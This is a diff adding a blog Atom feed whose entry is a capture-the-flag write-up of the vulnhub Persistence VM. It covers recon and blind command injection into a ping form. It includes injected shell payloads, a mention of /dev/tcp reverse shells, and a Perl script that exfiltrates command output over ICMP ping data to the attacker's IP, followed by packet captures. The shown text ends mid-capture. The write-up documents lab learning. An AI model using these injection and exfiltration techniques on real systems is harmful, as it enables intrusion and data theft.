@@ -1,0 +1,1340 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Blind Command Injection | Knapsy's brain dump]]></title>
+  <link href="http://knapsy.github.io/blog/categories/blind-command-injection/atom.xml" rel="self"/>
+  <link href="http://knapsy.github.io/"/>
+  <updated>2014-10-07T22:53:37+11:00</updated>
+  <id>http://knapsy.github.io/</id>
+  <author>
+    <name><![CDATA[Knapsy]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Persistence VM Writeup]]></title>
+    <link href="http://knapsy.github.io/blog/2014/10/05/persistence-vm-writeup/"/>
+    <updated>2014-10-05T23:02:09+11:00</updated>
+    <id>http://knapsy.github.io/blog/2014/10/05/persistence-vm-writeup</id>
+    <content type="html"><![CDATA[<p>Persistence was a new VM available at <a href="http://www.vulnhub.com/">vulnhub.com</a> provided by sagi and <a href="https://twitter.com/superkojiman">superkojiman</a> and there was actually an entire competition going on for a whole month based around it.</p>
+
+<p>I decided to try myself and see how far I will be able to get to&hellip; and because I&rsquo;m the type who doesn&rsquo;t give up easily, I managed to finally get a root shell and learn A LOT all the way throughout the challange. I wanted to document everything I did as it could be a good reference point for me in the future and maybe some people will also be able to benefit from it. So&hellip; let&rsquo;s get to it!</p>
+
+<!-- more -->
+
+
+<h2>Introduction</h2>
+
+<p>Ok, let&rsquo;s get it started! At first, I didn&rsquo;t really know what to expect from the challange, certainly not digging into the level of details I did, but man, I enjoyed it so much and learnt heaps! Anyway, let&rsquo;s get down to business.</p>
+
+<p>Booted up Persistence VM, started up my Kali VM and let&rsquo;s go.</p>
+
+<h2>Recon</h2>
+
+<p>Let&rsquo;s find out the IP address of Persistence, both Kali and Persistence are running in Host only networking mode in my VMWare Fusion so since they&rsquo;re on the same network, they&rsquo;re able to communicate with each other. Lets use netdiscover on ethernet interface to find out:</p>
+
+<pre><code>root@kali:~# netdiscover -i eth0
+ Currently scanning: 172.18.162.0/16   |   Screen View: Unique Hosts           
+
+ 18 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 1080             
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 172.16.246.1    00:50:56:c0:00:01    14    840   VMWare, Inc.                 
+ 172.16.246.128  00:0c:29:3a:9e:ba    02    120   VMware, Inc.                 
+ 172.16.246.254  00:50:56:e9:6d:00    02    120   VMWare, Inc.                 
+</code></pre>
+
+<p>Cool, so now we&rsquo;ve got the IP address, let&rsquo;s see what ports and services are listening:</p>
+
+<pre><code>root@kali:~# nmap -sV -A 172.16.246.128
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-09-28 17:50 EST
+Nmap scan report for 172.16.246.128
+Host is up (0.00044s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.4.7
+|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
+|_http-title: The Persistence of Memory - Salvador Dali
+MAC Address: 00:0C:29:3A:9E:BA (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.44 ms 172.16.246.128
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.97 seconds
+</code></pre>
+
+<p>Ha, we have a webserver listetning on port 80 (well, kinda expected) - let&rsquo;s see what&rsquo;s in there. Open up Icewessel and poke around. Unfortunately except a pretty picture there&rsquo;s nothing interesting in there. Check the source, nothing in there either. Okay, let&rsquo;s poke around a bit more - open up dirbuster and try to find something else.</p>
+
+<p>Using dirbuster wordlist that came with Kali, didn&rsquo;t take long to find debug.php page:</p>
+
+<pre><code>root@kali:~# dirbuster
+28/09/2014 6:02:23 PM java.util.prefs.FileSystemPreferences$2 run
+INFO: Created user preferences directory.
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 200
+File found: /debug.php - 200
+</code></pre>
+
+<h2>Blind command injection</h2>
+
+<p>Awesome, looks like we can try to do something here. First thought - command injection! But let&rsquo;s see how the site is supposed to work - allegedly it&rsquo;s for pinging addresses, so I typed in &ldquo;localhost&rdquo; and clicked submit. You can see that the server is &ldquo;thinking&rdquo; a bit and returns to the page without displaying any results. When you provide an invalid input &ldquo;blah&rdquo;, it comes back to the form straight away and also doesn&rsquo;t display any results.</p>
+
+<p>Ok, if there is a command injection vulnerability, it&rsquo;ll be a blind command injection and we&rsquo;ll either need to hope that the command just works (e.g. trying to spawn a shell) or we&rsquo;ll need to come up with some way to send results back to us.</p>
+
+<p>Let&rsquo;s first see if there&rsquo;s a command injection vulnerability. The simplest way would be to try to ping back our host, so I have started packet capture and typed in the following in our webform:</p>
+
+<pre><code>localhost; ping -c 1 172.16.246.129
+</code></pre>
+
+<p>Ha! It is vulnerable as we can see ping packet coming back to our host:</p>
+
+<pre><code>root@kali:~# tcpdump -i eth0 -n icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
+18:19:34.216444 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 63238, seq 1, length 64
+18:19:34.216480 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 63238, seq 1, length 64
+</code></pre>
+
+<p>So now we need to find out what we can actually do with it. I&rsquo;ve come up with a one-liner to test out number of commands that we can utilise:</p>
+
+<pre><code>localhost; command; if [ $? -eq 0 ]; then ping -c 1 172.16.246.129; fi
+</code></pre>
+
+<p>It&rsquo;ll ping me back if the &lsquo;command&rsquo; is successful. From now on I started running all bunch of different commands to find out what I can actually do on the system and what potential shells I could spawn. I tried number of various commands such as:</p>
+
+<ul>
+<li>ls /usr/bin/python</li>
+<li>touch /tmp/test</li>
+<li>echo &ldquo;test&rdquo; > /tmp/test</li>
+<li>&hellip; and many many more.</li>
+</ul>
+
+
+<p>Some of them returned success, so it gave me pretty good idea what I may be able to do here.</p>
+
+<p>Next, I started playing around with shells - I was trying to spawn various TCP shells using either python or native bash (with redirections to /dev/tcp/172.16.246.129/31337), but with no success. I tried researching and attempting to spawn some UDP shells, but also with not much luck.</p>
+
+<p>After many many hours of trying everything I could think of, it seemed that pretty much everything except ping is being blocked by a firewall. I was tempted to start looking into spawning shells over ICMP, but after quick research I couldn&rsquo;t really find any way of doing it without additional software that I would need to put on persistence, so my next step was trying to find a way of sending back output of my commands. Back to basics, RTFM:</p>
+
+<pre><code>man ping
+</code></pre>
+
+<p>Hmmm, something interesting, -p option (sending data in the data portion of the icmp packet)&hellip; I could use that to send back output back to myself! I can only send 56 bytes at a time, but that&rsquo;s ok - I&rsquo;ll just split the response into number of chunks and send them over one-by-one.</p>
+
+<p>I have created a Perl script to send out commands to persistence via vulnerable debug.php, run output via xxd and save it in a hex format in a temp file, read the output file 16 characters at a time and send it back in a data portion of the icmp packet. This way it&rsquo;ll be a lot easier for me to run number of commands quickly without trying to type it in and modify in this small text field on debug.php site.</p>
+
+<p><figure class='code'><figcaption><span>Post form data </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="o">!</span><span class="sr">/usr/</span><span class="n">bin</span><span class="sr">/perl&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="n">Target</span> <span class="n">URL</span><span class="sr">&lt;/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="nv">$target_url</span><span class="o">=&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://172.16.246.128/debug.php&quot;</span><span class="o">&gt;</span><span class="n">http:</span><span class="sr">//</span><span class="mf">172.16.246.128</span><span class="sr">/debug.php&lt;/</span><span class="n">a</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;;</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="n">Host</span> <span class="n">IP</span><span class="sr">&lt;/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="nv">$host_ip</span><span class="o">=&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">172.16.246.129</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;;</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="n">Command</span> <span class="n">to</span> <span class="n">run</span><span class="sr">&lt;/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="nv">$CMD</span><span class="o">=&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pwd</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;;</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">use</span> <span class="n">LWP</span><span class="p">;</span>
+</span><span class='line'><span class="k">use</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;HTTP::Request::Common;&quot;</span><span class="o">&gt;</span><span class="nn">HTTP::Request::</span><span class="n">Common</span><span class="p">;</span><span class="sr">&lt;/a&gt;</span>
+</span><span class='line'><span class="nv">$ua</span> <span class="o">=</span> <span class="nv">$ua</span> <span class="o">=</span> <span class="nn">LWP::</span><span class="n">UserAgent</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">;;</span>
+</span><span class='line'><span class="nv">$res</span> <span class="o">=</span> <span class="nv">$ua</span><span class="o">-&gt;</span><span class="n">request</span><span class="p">(</span><span class="n">POST</span> <span class="nv">$target_url</span><span class="p">,</span>
+</span><span class='line'><span class="n">Content_Type</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span>
+</span><span class='line'><span class="n">Content</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span><span class='line'><span class="n">addr</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">localhost</span><span class="p">;</span> <span class="n">COMMAND</span><span class="o">=\&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="nv">$CMD</span><span class="o">\&amp;</span><span class="n">ldquo</span><span class="p">;;</span> <span class="o">\</span><span class="nv">$COMMAND</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="n">amp</span><span class="p">;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">p</span> <span class="o">&gt;</span> <span class="sr">/tmp/</span><span class="o">\</span><span class="nv">$COMMAND</span><span class="o">.</span><span class="nb">hex</span><span class="p">;</span> <span class="k">while</span> <span class="nb">read</span> <span class="o">-</span><span class="n">n</span> <span class="mi">16</span> <span class="nb">hex</span><span class="p">;</span> <span class="k">do</span> <span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="o">-</span><span class="n">p</span> <span class="o">\</span><span class="nv">$hex</span> <span class="nv">$host_ip</span><span class="p">;</span> <span class="n">done</span> <span class="o">&amp;</span><span class="ow">lt</span><span class="p">;</span> <span class="sr">/tmp/</span><span class="o">\</span><span class="nv">$COMMAND</span><span class="o">.</span><span class="nb">hex</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]);</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>So, first test with pwd command (as in the above source). Again, I&rsquo;ve started tcpdump (this time with -X option to also display data portion of the packet) and let&rsquo;s see what happens:</p>
+
+<pre><code>root@kali:~/data/scripts/send-command# ./send_command
+</code></pre>
+
+<pre><code>root@kali:~# tcpdump -i eth0 -n icmp -X
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
+
+
+19:12:48.296955 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 24328, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 98ae 5f08 0001 1b5a 2854  ........_....Z(T
+    0x0020:  5c30 0000 2f75 7372 2f73 6861 2f75 7372  \0../usr/sha/usr
+    0x0030:  2f73 6861 2f75 7372 2f73 6861 2f75 7372  /sha/usr/sha/usr
+    0x0040:  2f73 6861 2f75 7372 2f73 6861 2f75 7372  /sha/usr/sha/usr
+    0x0050:  2f73 6861                                /sha
+19:12:48.297021 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 24328, seq 1, length 64
+    0x0000:  4500 0054 e0a4 0000 4001 54e1 ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 a0ae 5f08 0001 1b5a 2854  ........_....Z(T
+    0x0020:  5c30 0000 2f75 7372 2f73 6861 2f75 7372  \0../usr/sha/usr
+    0x0030:  2f73 6861 2f75 7372 2f73 6861 2f75 7372  /sha/usr/sha/usr
+    0x0040:  2f73 6861 2f75 7372 2f73 6861 2f75 7372  /sha/usr/sha/usr
+    0x0050:  2f73 6861                                /sha
+19:12:48.298002 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 24584, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 00d3 6008 0001 1b5a 2854  ........`....Z(T
+    0x0020:  8534 0000 7265 2f6e 6769 6e78 7265 2f6e  .4..re/nginxre/n
+    0x0030:  6769 6e78 7265 2f6e 6769 6e78 7265 2f6e  ginxre/nginxre/n
+    0x0040:  6769 6e78 7265 2f6e 6769 6e78 7265 2f6e  ginxre/nginxre/n
+    0x0050:  6769 6e78                                ginx
+19:12:48.298021 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 24584, seq 1, length 64
+    0x0000:  4500 0054 e0a5 0000 4001 54e0 ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 08d3 6008 0001 1b5a 2854  ........`....Z(T
+    0x0020:  8534 0000 7265 2f6e 6769 6e78 7265 2f6e  .4..re/nginxre/n
+    0x0030:  6769 6e78 7265 2f6e 6769 6e78 7265 2f6e  ginxre/nginxre/n
+    0x0040:  6769 6e78 7265 2f6e 6769 6e78 7265 2f6e  ginxre/nginxre/n
+    0x0050:  6769 6e78                                ginx
+19:12:48.298980 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 24840, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 4e0f 6108 0001 1b5a 2854  ......N.a....Z(T
+    0x0020:  8638 0000 746d 6c0a 2f68 746d 6c0a 2f68  .8..tml./html./h
+    0x0030:  746d 6c0a 2f68 746d 6c0a 2f68 746d 6c0a  tml./html./html.
+    0x0040:  2f68 746d 6c0a 2f68 746d 6c0a 2f68 746d  /html./html./htm
+    0x0050:  6c0a 2f68                                l./h
+19:12:48.298990 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 24840, seq 1, length 64
+    0x0000:  4500 0054 e0a6 0000 4001 54df ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 560f 6108 0001 1b5a 2854  ......V.a....Z(T
+    0x0020:  8638 0000 746d 6c0a 2f68 746d 6c0a 2f68  .8..tml./html./h
+    0x0030:  746d 6c0a 2f68 746d 6c0a 2f68 746d 6c0a  tml./html./html.
+    0x0040:  2f68 746d 6c0a 2f68 746d 6c0a 2f68 746d  /html./html./htm
+    0x0050:  6c0a 2f68                                l./h
+</code></pre>
+
+<p>Woohoo, getting some data back! A bit hard to read, but we can manage - output of this one is &lsquo;/usr/share/nginx/html&rsquo;.</p>
+
+<p>Alright, let&rsquo;s see what else do we have here - try ls command. Modify source of my script a bit ($CMD=&lsquo;ls&rsquo;) and send it through. Hmmmmm&hellip; something interesting in the output:</p>
+
+<pre><code>19:19:17.227286 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 42760, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 ca27 a708 0001 9f5b 2854  .......'.....[(T
+    0x0020:  fa74 0e00 6465 6275 672e 7068 6465 6275  .t..debug.phdebu
+    0x0030:  672e 7068 6465 6275 672e 7068 6465 6275  g.phdebug.phdebu
+    0x0040:  672e 7068 6465 6275 672e 7068 6465 6275  g.phdebug.phdebu
+    0x0050:  672e 7068                                g.ph
+19:19:17.227311 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 42760, seq 1, length 64
+    0x0000:  4500 0054 e0a7 0000 4001 54de ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 d227 a708 0001 9f5b 2854  .......'.....[(T
+    0x0020:  fa74 0e00 6465 6275 672e 7068 6465 6275  .t..debug.phdebu
+    0x0030:  672e 7068 6465 6275 672e 7068 6465 6275  g.phdebug.phdebu
+    0x0040:  672e 7068 6465 6275 672e 7068 6465 6275  g.phdebug.phdebu
+    0x0050:  672e 7068                                g.ph
+19:19:17.228091 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 43016, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 b681 a808 0001 9f5b 2854  .............[(T
+    0x0020:  7f78 0e00 700a 696e 6465 782e 700a 696e  .x..p.index.p.in
+    0x0030:  6465 782e 700a 696e 6465 782e 700a 696e  dex.p.index.p.in
+    0x0040:  6465 782e 700a 696e 6465 782e 700a 696e  dex.p.index.p.in
+    0x0050:  6465 782e                                dex.
+19:19:17.228100 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 43016, seq 1, length 64
+    0x0000:  4500 0054 e0a8 0000 4001 54dd ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 be81 a808 0001 9f5b 2854  .............[(T
+    0x0020:  7f78 0e00 700a 696e 6465 782e 700a 696e  .x..p.index.p.in
+    0x0030:  6465 782e 700a 696e 6465 782e 700a 696e  dex.p.index.p.in
+    0x0040:  6465 782e 700a 696e 6465 782e 700a 696e  dex.p.index.p.in
+    0x0050:  6465 782e                                dex.
+19:19:17.228811 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 43272, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 9437 a908 0001 9f5b 2854  .......7.....[(T
+    0x0020:  427b 0e00 6874 6d6c 0a70 6572 6874 6d6c  B{..html.perhtml
+    0x0030:  0a70 6572 6874 6d6c 0a70 6572 6874 6d6c  .perhtml.perhtml
+    0x0040:  0a70 6572 6874 6d6c 0a70 6572 6874 6d6c  .perhtml.perhtml
+    0x0050:  0a70 6572                                .per
+19:19:17.228837 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 43272, seq 1, length 64
+    0x0000:  4500 0054 e0a9 0000 4001 54dc ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 9c37 a908 0001 9f5b 2854  .......7.....[(T
+    0x0020:  427b 0e00 6874 6d6c 0a70 6572 6874 6d6c  B{..html.perhtml
+    0x0030:  0a70 6572 6874 6d6c 0a70 6572 6874 6d6c  .perhtml.perhtml
+    0x0040:  0a70 6572 6874 6d6c 0a70 6572 6874 6d6c  .perhtml.perhtml
+    0x0050:  0a70 6572                                .per
+19:19:17.229654 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 43528, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 c365 aa08 0001 9f5b 2854  .......e.....[(T
+    0x0020:  527e 0e00 7374 656e 7369 7374 656e 7369  R~..stensistensi
+    0x0030:  7374 656e 7369 7374 656e 7369 7374 656e  stensistensisten
+    0x0040:  7369 7374 656e 7369 7374 656e 7369 7374  sistensistensist
+    0x0050:  656e 7369                                ensi
+19:19:17.229664 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 43528, seq 1, length 64
+    0x0000:  4500 0054 e0aa 0000 4001 54db ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 cb65 aa08 0001 9f5b 2854  .......e.....[(T
+    0x0020:  527e 0e00 7374 656e 7369 7374 656e 7369  R~..stensistensi
+    0x0030:  7374 656e 7369 7374 656e 7369 7374 656e  stensistensisten
+    0x0040:  7369 7374 656e 7369 7374 656e 7369 7374  sistensistensist
+    0x0050:  656e 7369                                ensi
+19:19:17.230462 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 43784, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 412b ab08 0001 9f5b 2854  ......A+.....[(T
+    0x0020:  ae81 0e00 6365 5f6f 665f 6d65 6365 5f6f  ....ce_of_mece_o
+    0x0030:  665f 6d65 6365 5f6f 665f 6d65 6365 5f6f  f_mece_of_mece_o
+    0x0040:  665f 6d65 6365 5f6f 665f 6d65 6365 5f6f  f_mece_of_mece_o
+    0x0050:  665f 6d65                                f_me
+19:19:17.230470 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 43784, seq 1, length 64
+    0x0000:  4500 0054 e0ab 0000 4001 54da ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 492b ab08 0001 9f5b 2854  ......I+.....[(T
+    0x0020:  ae81 0e00 6365 5f6f 665f 6d65 6365 5f6f  ....ce_of_mece_o
+    0x0030:  665f 6d65 6365 5f6f 665f 6d65 6365 5f6f  f_mece_of_mece_o
+    0x0040:  665f 6d65 6365 5f6f 665f 6d65 6365 5f6f  f_mece_of_mece_o
+    0x0050:  665f 6d65                                f_me
+19:19:17.231224 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 44040, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 6bc1 ac08 0001 9f5b 2854  ......k......[(T
+    0x0020:  b684 0e00 6d6f 7279 5f62 795f 6d6f 7279  ....mory_by_mory
+    0x0030:  5f62 795f 6d6f 7279 5f62 795f 6d6f 7279  _by_mory_by_mory
+    0x0040:  5f62 795f 6d6f 7279 5f62 795f 6d6f 7279  _by_mory_by_mory
+    0x0050:  5f62 795f                                _by_
+19:19:17.231232 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 44040, seq 1, length 64
+    0x0000:  4500 0054 e0ac 0000 4001 54d9 ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 73c1 ac08 0001 9f5b 2854  ......s......[(T
+    0x0020:  b684 0e00 6d6f 7279 5f62 795f 6d6f 7279  ....mory_by_mory
+    0x0030:  5f62 795f 6d6f 7279 5f62 795f 6d6f 7279  _by_mory_by_mory
+    0x0040:  5f62 795f 6d6f 7279 5f62 795f 6d6f 7279  _by_mory_by_mory
+    0x0050:  5f62 795f                                _by_
+19:19:17.231999 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 44296, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 8dfc ad08 0001 9f5b 2854  .............[(T
+    0x0020:  c487 0e00 7465 7370 6172 672d 7465 7370  ....tesparg-tesp
+    0x0030:  6172 672d 7465 7370 6172 672d 7465 7370  arg-tesparg-tesp
+    0x0040:  6172 672d 7465 7370 6172 672d 7465 7370  arg-tesparg-tesp
+    0x0050:  6172 672d                                arg-
+19:19:17.232008 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 44296, seq 1, length 64
+    0x0000:  4500 0054 e0ad 0000 4001 54d8 ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 95fc ad08 0001 9f5b 2854  .............[(T
+    0x0020:  c487 0e00 7465 7370 6172 672d 7465 7370  ....tesparg-tesp
+    0x0030:  6172 672d 7465 7370 6172 672d 7465 7370  arg-tesparg-tesp
+    0x0040:  6172 672d 7465 7370 6172 672d 7465 7370  arg-tesparg-tesp
+    0x0050:  6172 672d                                arg-
+19:19:17.232682 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 44552, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 e0fb ae08 0001 9f5b 2854  .............[(T
+    0x0020:  648a 0e00 716f 3034 6434 716f 3034 6434  d...qo04d4qo04d4
+    0x0030:  716f 3034 6434 716f 3034 6434 716f 3034  qo04d4qo04d4qo04
+    0x0040:  6434 716f 3034 6434 716f 3034 6434 716f  d4qo04d4qo04d4qo
+    0x0050:  3034 6434                                04d4
+19:19:17.232690 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 44552, seq 1, length 64
+    0x0000:  4500 0054 e0ae 0000 4001 54d7 ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 e8fb ae08 0001 9f5b 2854  .............[(T
+    0x0020:  648a 0e00 716f 3034 6434 716f 3034 6434  d...qo04d4qo04d4
+    0x0030:  716f 3034 6434 716f 3034 6434 716f 3034  qo04d4qo04d4qo04
+    0x0040:  6434 716f 3034 6434 716f 3034 6434 716f  d4qo04d4qo04d4qo
+    0x0050:  3034 6434                                04d4
+19:19:17.233416 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 44808, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 36ea af08 0001 9f5b 2854  ......6......[(T
+    0x0020:  4d8d 0e00 382e 6a70 670a 7379 382e 6a70  M...8.jpg.sy8.jp
+    0x0030:  670a 7379 382e 6a70 670a 7379 382e 6a70  g.sy8.jpg.sy8.jp
+    0x0040:  670a 7379 382e 6a70 670a 7379 382e 6a70  g.sy8.jpg.sy8.jp
+    0x0050:  670a 7379                                g.sy
+19:19:17.233429 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 44808, seq 1, length 64
+    0x0000:  4500 0054 e0af 0000 4001 54d6 ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 3eea af08 0001 9f5b 2854  ......&gt;......[(T
+    0x0020:  4d8d 0e00 382e 6a70 670a 7379 382e 6a70  M...8.jpg.sy8.jp
+    0x0030:  670a 7379 382e 6a70 670a 7379 382e 6a70  g.sy8.jpg.sy8.jp
+    0x0040:  670a 7379 382e 6a70 670a 7379 382e 6a70  g.sy8.jpg.sy8.jp
+    0x0050:  670a 7379                                g.sy
+19:19:17.234099 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 45064, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 e88d b008 0001 9f5b 2854  .............[(T
+    0x0020:  f18f 0e00 7361 646d 696e 2d74 7361 646d  ....sadmin-tsadm
+    0x0030:  696e 2d74 7361 646d 696e 2d74 7361 646d  in-tsadmin-tsadm
+    0x0040:  696e 2d74 7361 646d 696e 2d74 7361 646d  in-tsadmin-tsadm
+    0x0050:  696e 2d74                                in-t
+19:19:17.234108 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 45064, seq 1, length 64
+    0x0000:  4500 0054 e0b0 0000 4001 54d5 ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 f08d b008 0001 9f5b 2854  .............[(T
+    0x0020:  f18f 0e00 7361 646d 696e 2d74 7361 646d  ....sadmin-tsadm
+    0x0030:  696e 2d74 7361 646d 696e 2d74 7361 646d  in-tsadmin-tsadm
+    0x0040:  696e 2d74 7361 646d 696e 2d74 7361 646d  in-tsadmin-tsadm
+    0x0050:  696e 2d74                                in-t
+19:19:17.234794 IP 172.16.246.128 &gt; 172.16.246.129: ICMP echo request, id 45320, seq 1, length 64
+    0x0000:  4500 0054 0000 4000 4001 f585 ac10 f680  E..T..@.@.......
+    0x0010:  ac10 f681 0800 78fd b108 0001 9f5b 2854  ......x......[(T
